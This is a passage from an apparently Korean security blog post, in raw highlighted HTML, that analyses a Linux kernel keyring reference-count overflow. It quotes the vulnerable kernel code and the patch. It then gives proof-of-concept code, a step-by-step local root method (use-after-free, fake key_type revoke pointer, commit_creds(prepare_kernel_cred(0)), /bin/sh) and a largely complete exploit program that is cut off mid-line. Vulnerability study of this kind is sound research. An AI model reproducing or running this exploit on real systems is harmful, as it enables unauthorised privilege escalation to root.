<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="real-cred-vs-cred"><a href="#real-cred-vs-cred" class="headerlink" title="real_cred vs cred"></a>real_cred vs cred</h3><ul>
<li>linux에서는 한 task가 다른 task에 접근할 때 작용하는 권한과, 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 분리해 놓았다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>real_cred (1) : 다른 task가 이 task에 접근하기 위해서 가지고 있어야 하는 권한을 의미한다.</li>
<li>cred (2) : 이 task가 다른 task에 접근하거나, 특정 작업을 수행할 때 행사하는 권한을 의미한다.</li>
</ul>
<h2 id="part2-name이-NULL일-경우"><a href="#part2-name이-NULL일-경우" class="headerlink" title="part2 : name이 NULL일 경우"></a>part2 : name이 NULL일 경우</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	serial = <span class="keyword">new</span>-&gt;session_keyring-&gt;serial;</span><br><span class="line">	ret = commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">		ret = serial;</span><br><span class="line">	<span class="keyword">goto</span> okay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>join_session_keyring()함수의 인자인 name이 없다면, install_session_keyring_to_cred() 함수를 호출한다.</li>
<li>수정후 commit_creds(new)호출을 통해 수정된 cred를 커밋 시킨다.</li>
</ul>
<h3 id="install-session-keyring-to-cred"><a href="#install-session-keyring-to-cred" class="headerlink" title="install_session_keyring_to_cred"></a>install_session_keyring_to_cred</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install a session keyring directly to a credentials struct.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">install_session_keyring_to_cred</span><span class="params">(struct cred *cred, struct key *keyring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">	might_sleep();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create an empty session keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!keyring) &#123;</span><br><span class="line">		flags = KEY_ALLOC_QUOTA_OVERRUN;</span><br><span class="line">		<span class="keyword">if</span> (cred-&gt;session_keyring)</span><br><span class="line">			flags = KEY_ALLOC_IN_QUOTA;</span><br><span class="line"></span><br><span class="line">		keyring = keyring_alloc(<span class="string">&quot;_ses&quot;</span>, cred-&gt;uid, cred-&gt;gid, cred,</span><br><span class="line">					KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ,</span><br><span class="line">					flags, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring))</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(keyring);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		__key_get(keyring);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* install the keyring */</span></span><br><span class="line">	old = cred-&gt;session_keyring;</span><br><span class="line">	rcu_assign_pointer(cred-&gt;session_keyring, keyring);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (old)</span><br><span class="line">		key_put(old);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>install_session_keyring_to_cred()함수의 역할은 cred 구조체에 직접적으로 session keyring을 등록한다.</li>
<li>즉, install_session_keyring_to_cred(new,NULL)은 익명의 keyring을 만들고, 이 keyring을 new cred에 등록한다.</li>
</ul>
<h2 id="part3-name이-NULL이-아닐-경우"><a href="#part3-name이-NULL이-아닐-경우" class="headerlink" title="part3 : name이 NULL이 아닐 경우"></a>part3 : name이 NULL이 아닐 경우</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	mutex_lock(&amp;key_session_mutex);</span><br><span class="line"></span><br><span class="line">	keyring = find_keyring_by_name(name, <span class="literal">false</span>); </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (PTR_ERR(keyring) == -ENOKEY) &#123;</span><br><span class="line">		keyring = keyring_alloc(</span><br><span class="line">			name, old-&gt;uid, old-&gt;gid, old,</span><br><span class="line">			KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,</span><br><span class="line">			KEY_ALLOC_IN_QUOTA, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(keyring)) &#123;</span><br><span class="line">			ret = PTR_ERR(keyring);</span><br><span class="line">			<span class="keyword">goto</span> error2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(keyring)) &#123; </span><br><span class="line">		ret = PTR_ERR(keyring);</span><br><span class="line">		<span class="keyword">goto</span> error2; </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">		ret = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	ret = install_session_keyring_to_cred(<span class="keyword">new</span>, keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error2;</span><br><span class="line"></span><br><span class="line">	commit_creds(<span class="keyword">new</span>);</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex); </span><br><span class="line"></span><br><span class="line">	ret = keyring-&gt;serial; </span><br><span class="line">	key_put(keyring); </span><br><span class="line">okay:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">error2:</span><br><span class="line">	mutex_unlock(&amp;key_session_mutex);</span><br><span class="line">error:</span><br><span class="line">	abort_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>mutex_lock을 통해 자원 접근을 막는다.</li>
<li>find_keyring_by_name 함수를 호출해 같은 name의  keyring이 있는지 확인한다.</li>
<li>이름이 없다면, <ul>
<li>해당 name으로 keyring을 만든다. (keyring_alloc)</li>
<li>만든 keyring을 cred 구조체 new에 등록한다. (install_session_keyring_to_cred)</li>
<li>수정한 내용을 커밋한다. (commit_creds)</li>
<li>뮤텍스를 해제한다. (mutex_unlock)</li>
<li>keyring-&gt;usage를 감소시킨다. (key_put)</li>
<li>새로 생성한 keyring-&gt;serial을 반환한다.</li>
</ul>
</li>
<li>이름이 있다면,<ul>
<li>goto error2로 이동한다.  </li>
<li>뮤텍스를 해제한다.</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>여기서 해당 부분이 취약점을 일으키는데, keyring의 이름이 현재 session의 keyring과 같으면 바로 goto error2로 이동하게 된다.</li>
<li>이 과정에서 keyring-&gt;usage에 대한 Integer OverFlow가 발생한다.</li>
<li>어떻게 취약점이 발생하는지 알기 위해서는 먼저 find_keyring_by_name 함수를 알아야 한다.</li>
</ul>
<h3 id="find-keyring-by-name"><a href="#find-keyring-by-name" class="headerlink" title="find_keyring_by_name"></a>find_keyring_by_name</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct key *<span class="title">find_keyring_by_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">bool</span> skip_perm_check)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring</span>;</span></span><br><span class="line">	<span class="keyword">int</span> bucket;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!name)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	bucket = keyring_hash(name);</span><br><span class="line"></span><br><span class="line">	read_lock(&amp;keyring_name_lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (keyring_name_hash[bucket].next) &#123;</span><br><span class="line">		<span class="comment">/* search this hash bucket for a keyring with a matching name</span></span><br><span class="line"><span class="comment">		 * that&#x27;s readable and that hasn&#x27;t been revoked */</span></span><br><span class="line">		list_for_each_entry(keyring,</span><br><span class="line">				    &amp;keyring_name_hash[bucket],</span><br><span class="line">				    type_data.link</span><br><span class="line">				    ) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!kuid_has_mapping(current_user_ns(), keyring-&gt;user-&gt;uid))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (test_bit(KEY_FLAG_REVOKED, &amp;keyring-&gt;flags))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(keyring-&gt;description, name) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!skip_perm_check &amp;&amp;</span><br><span class="line">			    key_permission(make_key_ref(keyring, <span class="number">0</span>),</span><br><span class="line">					   KEY_NEED_SEARCH) &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* we&#x27;ve got a match but we might end up racing with</span></span><br><span class="line"><span class="comment">			 * key_cleanup() if the keyring is currently &#x27;dead&#x27;</span></span><br><span class="line"><span class="comment">			 * (ie. it has a zero usage count) */</span></span><br><span class="line">			<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;keyring-&gt;usage))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			keyring-&gt;last_used_at = current_kernel_time().tv_sec;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	keyring = ERR_PTR(-ENOKEY);</span><br><span class="line">out:</span><br><span class="line">	read_unlock(&amp;keyring_name_lock);</span><br><span class="line">	<span class="keyword">return</span> keyring;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>find_keyring_by_name 함수는 list를 돌아가며 같은 이름의 keyring이 있는지 찾아준다.</li>
<li>여기서 같은 이름이 있다면 마지막 부분에 atomic_inc_not_zero(&amp;keyring-&gt;usage)를 호출한다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * atomic_inc_not_zero - increment unless the number is zero</span></span><br><span class="line"><span class="comment"> * @v: pointer of type atomic_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Atomically increments @v by 1, so long as @v is non-zero.</span></span><br><span class="line"><span class="comment"> * Returns non-zero if @v was non-zero, and zero otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> atomic_inc_not_zero</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> atomic_inc_not_zero(v)		atomic_add_unless((v), 1, 0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>atomic_inc_not_zero(&amp;keyring-&gt;usage)는 keyring-&gt;usage가 0이 아니면 증가시킨다.</li>
<li>여기서 증가된 keyring-&gt;usage는 반드시 key_put을 통해 감소시켜야 하는데, 감소시키는 부분이 존재하지 않음을 확인할 수 있다.</li>
<li>keyring-&gt;usage는 atomic_t == int형 이므로, 계속 증가시킨다면 Integer OverFlow를 발생시킬 수 있다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (keyring == <span class="keyword">new</span>-&gt;session_keyring) &#123;</span><br><span class="line">	key_put(keyring); <span class="comment">//patched</span></span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">goto</span> error2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>패치된 코드를 보면, goto error2로 가기 전에 key_put(keyring)을 통해 증가된 keyring-&gt;usage를 감소시키는 것을 확인할 수 있다.</li>
<li>이를 통해 Integer OverFlow를 막을 수 있다.</li>
</ul>
<h2 id="poc-code"><a href="#poc-code" class="headerlink" title="poc code"></a>poc code</h2><ul>
<li>취약점을 증명하기 위한 PoC코드는 다음과 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>먼저 “TestSession”이라는 name의 keyring을 만들고, 다시 한 번 같은 이름의 keyring을 만든다.</li>
<li>keyctl_join_session_keyring은 find_keyring_by_name를 호출 할 것이며 이를 통해 keyring-&gt;usage는 계속 증가할 것이다.</li>
<li>keyring의 정보는 /proc/keys에서 확인 할 수 있다.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/98797011-6165a600-244f-11eb-9955-a46887866a07.png" alt="334"></p>
<ul>
<li>위와 같이 “TestSession”의 refcount가 계속 증가하는 것을  확인할 수 있다.</li>
<li>만약 0xffffffff(2^32)번 만큼 실행을 시킨다면, Integer OverFlow를 통하여 refcount를 0으로 초기화 시킬 수 있을 것이다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">key_serial_t</span> serial;</span><br><span class="line"></span><br><span class="line">        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                keyctl(KEYCTL_JOIN_SESSION_KEYRING, <span class="string">&quot;TestSession&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&quot;cat /proc/keys&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>keyctl(KEYCTL_JOIN_SESSION_KEYRING,”TestSession”)을 2^32번 반복한 후, /proc/keys를 확인한다.</li>
</ul>
<h2 id="How-to-exploit"><a href="#How-to-exploit" class="headerlink" title="How to exploit?"></a>How to exploit?</h2><ol>
<li>Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.</li>
<li>해당 Keyring 오브젝트의 Usage를 Overflow 시킨다.</li>
<li>Keyring 오브젝트를 free시킨다. </li>
<li>user space에서 이미 free된 keyring 공간에 새로운 커널 오브젝트를 할당한다.</li>
<li>이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.</li>
</ol>
<ul>
<li>exploit의 핵심 함수는 key_revoke()이다.</li>
</ul>
<h3 id="key-revoke"><a href="#key-revoke" class="headerlink" title="key_revoke()"></a>key_revoke()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">key_revoke</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">time64_t</span> time;</span><br><span class="line">	key_check(key);</span><br><span class="line">	<span class="comment">/* make sure no one&#x27;s trying to change or use the key when we mark it</span></span><br><span class="line"><span class="comment">	 * - we tell lockdep that we might nest because we might be revoking an</span></span><br><span class="line"><span class="comment">	 *   authorisation key whilst holding the sem on a key we&#x27;ve just</span></span><br><span class="line"><span class="comment">	 *   instantiated</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	down_write_nested(&amp;key-&gt;sem, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;</span><br><span class="line">	    key-&gt;type-&gt;revoke)</span><br><span class="line">		key-&gt;type-&gt;revoke(key); </span><br><span class="line">	<span class="comment">/* set the death time to no more than the expiry time */</span></span><br><span class="line">	time = ktime_get_real_seconds();</span><br><span class="line">	<span class="keyword">if</span> (key-&gt;revoked_at == <span class="number">0</span> || key-&gt;revoked_at &gt; time) &#123;</span><br><span class="line">		key-&gt;revoked_at = time;</span><br><span class="line">		key_schedule_gc(key-&gt;revoked_at + key_gc_delay);</span><br><span class="line">	&#125;</span><br><span class="line">	up_write(&amp;key-&gt;sem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>key_revoke()에서 key-&gt;type-&gt;revoke(key)를 호출한다. </li>
<li>여기서 revoke는 key_type구조체에 있는 멤버이며, 함수 포인터이다.</li>
<li>즉, revoke를 우리가 원하는 함수의 주소로 덮어쓴 후 호출시킬수 있다.</li>
<li>revoke부분을 commit_creds(prepare_kernel_cred(0))가 호출되도록 덮어야 한다.</li>
<li>prepare_kernel_cred(0)을 호출,  root의 권한의 task를 가지고 commit_creds를 실행하기 때문에 현재 프로세스의 권한이 root가 되기 때문이다.</li>
</ul>
<h2 id="exploit-method"><a href="#exploit-method" class="headerlink" title="exploit method"></a>exploit method</h2><ul>
<li>user space에서 가짜 key_type을 만든다.</li>
<li>key_revoke가 실행될 때 root권한을 얻을 수 있도록 key_type-&gt;revoke에 commit_creds(prepare_kernel_cred(0))주소를 넣는다.</li>
<li>메세지 큐를 생성하고, 이때 이전에 free된 keyring의 위치가 재사용 된다.</li>
<li>메세지 큐를 이용해 keyring에 맞게 가짜 key_type을 전달한다.</li>
<li>keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING)를 호출한다.</li>
<li>key-&gt;type-&gt;revoke = commit_creds(prepare_kernel_cred(0))가 실행되어 root권한을 획득한다.</li>
<li>execl(“/bin/sh”, “/bin/sh”, NULL)을 호출하여 쉘을 획득한다.</li>
</ul>
<h2 id="exploit-Code"><a href="#exploit-Code" class="headerlink" title="exploit Code"></a>exploit Code</h2><ul>
<li>최종 exploit code는 다음과 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line">	<span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">		<span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">	&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">	<span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">	<span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span 